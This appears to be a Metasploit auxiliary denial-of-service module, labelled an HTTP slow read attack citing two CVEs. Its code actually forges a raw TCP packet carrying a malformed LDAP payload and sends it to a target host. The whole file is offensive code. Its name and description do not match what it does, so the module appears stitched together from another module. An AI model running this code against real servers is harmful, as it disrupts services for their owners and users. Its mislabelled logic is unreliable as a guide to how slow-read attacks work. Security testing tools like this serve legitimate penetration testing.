##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	#include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Dos

	def initialize
		super(
			'Name'        => 'HTTP Slow Read Attack',
			'Description' => %q{
				Implements an HTTP slow read attack.
			},
			'Author'      => ['Doug Prostko <dougtko[at]gmail.com>'],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'CVE', '2008-4609' ],
					[ 'CVE', '2009-1925' ],
					[ 'URL', 'https://community.qualys.com/blogs/securitylabs/2012/01/05/slow-read'],
				],
			'DisclosureDate' => '???')

		register_options([
			#OptInt.new('RPORT', [true, 'The destination port', 389]),
		], self.class)
	end

	def run

		open_pcap

		print_status("Sending malformed LDAP packet to #{rhost}")

		m = Rex::Text.rand_text_alpha_lower(3)

		p = PacketFu::TCPPacket.new
		p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
		p.ip_daddr = rhost
		p.tcp_ack = rand(0x100000000)
		p.tcp_flags.syn = 1
		p.tcp_flags.ack = 1
		p.tcp_dport = datastore['RPORT'].to_i
		p.tcp_window = 3072
		p.payload = "0O\002\002;\242cI\004\rdc=#{m},dc=#{m}\n\001\002\n\001\000\002\001\000\002\001\000\001\001\000\241'\243\016"
		p.recalc

		capture_sendto(p, rhost)
		close_pcap

	end
end
